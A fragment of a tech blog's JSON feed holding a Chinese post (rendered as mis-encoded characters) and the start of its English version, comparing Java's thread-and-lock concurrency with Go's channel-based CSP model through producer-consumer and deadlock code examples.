punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Condition</span> con<span class=\"token operator\">=</span>lock<span class=\"token punctuation\">.</span><span class=\"token function\">newCondition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">var</span> size <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> producer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span><br>                queue<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            producer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br><br>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> consumer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> queue<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume : \"</span> <span class=\"token operator\">+</span> item<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                con<span class=\"token punctuation\">.</span><span class=\"token function\">signal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            consumer<span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>ç”Ÿç”¢è€…å’Œæ¶ˆè²»è€…é€é queue æºé€šï¼Œæ¯æ¬¡å¾€ queue æ–°å¢/åˆªé™¤è³‡æ–™æ™‚ï¼Œéƒ½æœƒå…ˆç”¨ lock ä¿è­·ï¼Œç¢ºä¿ä¸€æ¬¡åªæœ‰ä¸€å€‹ thread èƒ½å­˜å– queueã€‚<br>\nThread &amp; Lock åŸºæœ¬ä¸Šå®Œå…¨æ¨¡æ“¬äº†åº•å±¤ç¡¬é«”è™•ç†ä¸¦è¡Œçš„è¡Œç‚ºï¼Œä¸”å¤§éƒ¨åˆ†ç¨‹å¼èªè¨€éƒ½æœ‰æ”¯æ´ï¼Œå› æ­¤å¯ä»¥å»£æ³›æ‡‰ç”¨åœ¨å¤§å¤šæ•¸çš„å ´æ™¯ã€‚<br>\nä½†æ˜¯ Thread &amp; Lock å¾ˆé›£å¯«å¥½ï¼Œä¸å°å¿ƒæœƒé€ æˆ deadlockã€‚å¦‚ä»¥ä¸‹çš„ codeï¼š</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> cacheLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> tableLock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>tableLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">synchronized</span> <span class=\"token punctuation\">(</span>cacheLock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hio2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token keyword\">public</span>  <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token punctuation\">{</span><br>                <span class=\"token function\">anotherMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token function\">oneMethod</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span></code></pre>\n<p>20 è¡Œçš„ Thread å’Œ 25 è¡Œçš„ Thread å½¼æ­¤ç­‰å¾…å°æ–¹çš„é–ï¼Œè®“ç¨‹å¼å¡ä½ã€‚<br>\nè€Œæ›´æ£˜æ‰‹çš„æ˜¯ deadlock é€šå¸¸ä¸å®¹æ˜“ç™¼ç¾ã€‚æƒ³åƒä¸€ä¸‹ä¸Šé¢çš„ codeï¼šè‹¥æ˜¯ <strong>oneMethod</strong> å’Œ <strong>anotherMethod</strong> æ˜¯ç¬¬ä¸‰æ–¹å¥—ä»¶æä¾›çš„æ–¹æ³•ï¼Œé™¤éä½  trace é codeï¼Œä¸ç„¶ä½ ç„¡æ³•ç¢ºä¿è©² method è£¡é¢æ˜¯å¦æœ‰ä½¿ç”¨åˆ° lockã€‚ç”šè‡³æœ‰å¯èƒ½åœ¨ä¾‹å¤–è™•ç†ä¸­å¿˜è¨˜è§£é–å°è‡´ç³»çµ± deadlockã€‚</p>\n<h1 id=\"communicating-sequential-process(csp)\"><a class=\"direct-link\" href=\"#communicating-sequential-process(csp)\">#</a> Communicating Sequential Process(CSP)</h1>\n<p>ç›¸è¼ƒæ–¼å¤šå€‹ Thread é€éå…±äº«è¨˜æ†¶é«”æºé€šçš„ Threa &amp; Lock å…¸ç¯„ï¼ŒCSP æå€¡é€éæºé€šä¾†å…±äº«è³‡è¨Šã€‚æ¦‚å¿µä¸Šå¦‚ä¸‹åœ–ï¼Œæ¯å€‹ Thread é€é channel ç™¼é€/æ¥æ”¶è¨Šæ¯ä¾†æºé€šï¼š</p>\n<p><img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/csp.png\" alt=\"\"></p>\n<p>Golang çš„ä¸¦è¡Œå…¸ç¯„å‰‡æ˜¯åœç¹è‘— CSP æ¦‚å¿µè¨­è¨ˆï¼Œ<a href=\"https://go.dev/blog/codelab-share\">Golang å®˜æ–¹ blog</a> æåˆ°:</p>\n<blockquote>\n<p>Do not communicate by sharing memory; instead, share memory by communicating.<br>\nä¸è¦é€éå…±äº«è¨˜æ†¶é«”æºé€šï¼Œé€éæºé€šä¾†å…±äº«è¨˜æ†¶é«”ã€‚</p>\n</blockquote>\n<p>åŒæ™‚ä½ å¯ä»¥åœ¨ Golang Sysn Package çš„æ–‡ä»¶ä¸­çœ‹åˆ°ä¸‹åˆ—æ•˜è¿°ï¼š</p>\n<blockquote>\n<p>Package sync provides basic synchronization primitives such as mutual exclusion locks. Other than the Once and WaitGroup types, most are intended for use by low-level library routines. Higher-level synchronization is better done via channels and communication.<br>\nPackage sync æä¾›åŸºç¤çš„åŒæ­¥åŸå‹ï¼Œåƒæ˜¯äº’æ–¥é–ã€‚é™¤äº† Once å’Œ WaitGroup ä»¥å¤–ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯æä¾›ç”¨ä¾†åšåº•å±¤ library ä½¿ç”¨ã€‚é«˜éšçš„åŒæ­¥å»ºè­°ä½¿ç”¨ channelÂ ã€‚</p>\n</blockquote>\n<p>å› æ­¤è‹¥æ˜¯ç”¨ Golang è§£æ±ºç”Ÿç”¢è€…/æ¶ˆè²»è€…å•é¡Œæ™‚ï¼Œç¨‹å¼å¯«èµ·ä¾†æœƒåƒé€™æ¨£ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tqueue <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token comment\">// producer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\t<span class=\"token comment\">// consumer</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume: %d\\n\"</span><span class=\"token punctuation\">,</span> item<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br><span class=\"token punctuation\">}</span></code></pre>\n<p>å¯ä»¥çœ‹åˆ° Golang å°‡è¤‡é›œçš„äº’æ–¥é–é‚è¼¯å°è£åœ¨ channel è£¡é¢ï¼Œé–‹ç™¼è€…å¯ä»¥å®‰å¿ƒåœ°ä½¿ç”¨ channel è€Œä¸ç”¨åˆ†å¿ƒ Lock &amp; Unlock çš„é‚è¼¯ã€‚ä»¥æ›´é«˜ä½çš„è§’åº¦ä¾†çœ‹ï¼Œå¯ä»¥èªªæ˜¯ Golang é¼“å‹µé–‹ç™¼è€…ç”¨ Channel æŠŠæ‰€æœ‰ Goroutine è§£è€¦åˆï¼Œä¹Ÿå°±æ˜¯ CSP çš„ç†å¿µã€‚åä¹‹ Thread &amp; Lock æœƒæŠŠæ‰€æœ‰ thread ç”¨ shared memory è€¦åˆåœ¨ä¸€èµ·ã€‚Â <br>\nä½†é€™æ˜¯æœ‰ä»£åƒ¹çš„â€Š-â€Šç‚ºäº†é”åˆ° Goroutine é–“ä¸å…±äº«è¨˜æ†¶é«”ï¼Œchannel åœ¨å¯¦ä½œä¸Šä¸¦ä¸æ˜¯æŠŠ sender çš„ç‰©ä»¶ç›´æ¥é€é channel å‚³çµ¦ receiverï¼Œè€Œæ˜¯å‚³éä¸€å€‹ copy çš„ç‰©ä»¶ï¼Œå¯ä»¥ç”¨ä¸‹é¢é€™æ®µ code é©—è­‰ï¼š</p>\n<pre class=\"language-go\"><code class=\"language-go\">\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> rand<span class=\"token punctuation\">.</span><span class=\"token function\">Intn</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Produce item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t\tqueue <span class=\"token operator\">&lt;-</span> item<br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\t<span class=\"token keyword\">go</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t\titem <span class=\"token operator\">:=</span> <span class=\"token operator\">&lt;-</span>queue<br>\t\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Consume item Addr: %v\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>item<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n<p>å¯¦éš› print åˆ°éŠ€å¹•ä¸Šçš„è¨˜æ†¶é«”ä½ç½®æœƒä¸ä¸€æ¨£ï¼š</p>\n<pre class=\"language-text\"><code class=\"language-text\">roduce item Addr: 0xc000014090<br>Consume item Addr: 0xc000120000</code></pre>\n<p>è€Œæ¯å€‹ç‰©ä»¶éƒ½éœ€è¦ copy åœ¨æ•ˆèƒ½ä¸Šæ˜¯ä¸€å®šæœƒæœ‰æè€—çš„ï¼Œé€™å°±æ˜¯ç”¨ channel æŠŠ goroutine è§£è€¦åˆè¦ä»˜å‡ºçš„ä»£åƒ¹ã€‚</p>\n<h1 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> çµè«–</h1>\n<p>ç•¶æˆ‘å€‘èªª Java çš„ä¸¦è¡Œæ˜¯ä»¥ Thread &amp; Lock ç‚ºåŸºåº•ï¼Œä¸¦ä¸ä»£è¡¨ Java ä¸èƒ½åšåˆ° CSPã€‚ä»¥ç”Ÿç”¢è€…/æ¶ˆè²»è€…çš„ç¯„ä¾‹ä¾†çœ‹ï¼Œ Java ç”¨ BlockingQueue å¯ä»¥åšåˆ°é¡ä¼¼ Golang çš„ channel çš„åŠŸèƒ½ã€‚åŒç†ï¼ŒGolang ä¸­ä¹Ÿæœ‰æä¾›çš„  sync package ä¸ä¹æœ‰ Mutexã€RWMutex ç­‰æ©Ÿåˆ¶ã€‚<br>\nä½†åœ¨ Java ä¸­ä½ æœƒçœ‹åˆ° Java çš„ä¸¦è¡Œç”Ÿæ…‹ç³»æœƒæ˜¯ç’°ç¹è‘— Thread &amp; Locl å»æ‰“é€ ï¼Œä½ æœƒçœ‹åˆ°å¤§é‡çš„ synchronized å»è¦ç¯„æŸå€‹å€æ®µä¸€æ¬¡åªèƒ½è¢«ä¸€å€‹ Thread åŸ·è¡Œï¼Œä½ æœƒçœ‹åˆ° Java æ–‡ç« å¸¸æåˆ°è¦ Thread-safe ç­‰æ¦‚å¿µã€‚è€Œåœ¨ Golang ä½ æ›´å¤šçš„æ˜¯çœ‹åˆ°æ€éº¼é‹ç”¨ select &amp; channel å»æ‰“é€ ä¸¦è¡Œç¨‹å¼ã€‚<br>\nåœ¨ä¸‹ä¸€ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘æœƒä»‹ç´¹ Golang å®˜ç¶²ä»‹ç´¹çš„å¹¾ç¨®å¸¸è¦‹çš„ Concurrency Patternï¼Œä»¥åŠå°æ‡‰ Java çš„å¯«æ³•åšæ¯”è¼ƒï¼Œè®“å¤§å®¶å¯ä»¥æ›´æ·±åˆ»é«”æœƒå…©ç¨®ä¸¦è¡Œå…¸ç¯„çš„å…§æ¶µå·®ç•°ã€‚</p>\n<h1 id=\"reference\"><a class=\"direct-link\" href=\"#reference\">#</a> Reference</h1>\n<p><a href=\"https://www.youtube.com/watch?v=KBZlN0izeiY\">GopherCon 2017: Kavya Joshiâ€Š-â€ŠUnderstanding Channels</a><br>\n<a href=\"https://pragprog.com/titles/pb7con/seven-concurrency-models-in-seven-weeks/\">Seven Concurrency Models in Seven Weeks When Threads Unravel</a></p>\n",
      "date_published": "2021-08-29T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-en/",
      "url": "https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-en/",
      "title": "Concurrency Paradigms: Golang V.S.Â Java",
      "content_html": "<!-- summary -->\n<p>I find that I was just using Golang's syntax to write Java after I reviewed the Golang code I wrote years ago, I was a newbie in Golang then. Especially in writing concurrency programs, the design ideas are totally different between Golang and Java: we are used to designing concurrency with the idea &quot;thread-safe&quot; in Java, but we would use the idea &quot;channel&quot; more in Golang.</p>\n<!-- summary -->\n<p>In this article, I want to discuss the different styles in writing concurrency programs between Java and Goalng, Hope that can help some newbie Golang programmers could have some basic concept while writing concurrency.</p>\n<h1 id=\"what-is-paradigms\"><a class=\"direct-link\" href=\"#what-is-paradigms\">#</a> What is Paradigms</h1>\n<p>Program paradigms are the guideline principle of how to writing a program, a higher level design pattern. For example, Object-Oriented Programming is one kind of Program paradigms. There are other program paradigms, like Functional programming. While paradigms differ in many ways, such differences are neither superior nor inferior to each other. There are suitable scenarios for each paradigm.</p>\n<p>Like program paradigms, there are also concurrency paradigms, like Thread &amp; Lock is one of those paradigms that you would follow while writing Java concurrency code. On the other hand, Go's concurrency paradigm is base on Communicating Sequential Process(CSP).<br>\nLet's deep into the difference more between these two paradigms in the following.</p>\n<h1 id=\"thread-%26-lock\"><a class=\"direct-link\" href=\"#thread-%26-lock\">#</a> Thread &amp;Â Lock</h1>\n<p>Thread &amp; Lock works like what underlying hardware does. Threads communicate with each other by sharing memory and ensure only one thread can access share memory by Lock. That's what we call mutual exclusion or mutex.</p>\n<p><img src=\"/img/posts/genchilu/concurrency_paradigms_golang_and_Java/thread_and_lock.png\" alt=\"\"></p>\n<p>Take the classic producer-consumer problem, for example, Java's implementation may use Lock like below:</p>\n<pre class=\"language-java\"><code class=\"language-java\">    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Lock</span> lock <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ReentrantLock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Queue</span> queue <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LinkedList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">static</span> <span class=\"token class-name\">Condition</span> con<span class=\"token operator\">=</span>lock<span class=\"token punctuation\">.</span><span class=\"token function\">newCondition</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">var</span> size <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span><br><br>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">var</span> producer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>                lock<span class=\"token punctuation\">.</span><span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>queue<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> size<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                        con<span class=\"token punctuation\">.</span><span class=\"token function\">await</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>                    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                    <span class=\"token punctuation\">}</span><br>                <span class=\"token punctuation\">}</span><br>                <span class=\"token keyword\">var</span> item <span class=\"token operator\">=</span> <span class=\"token class-name\">Math</span><span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span><br>                queue<span class=\"token 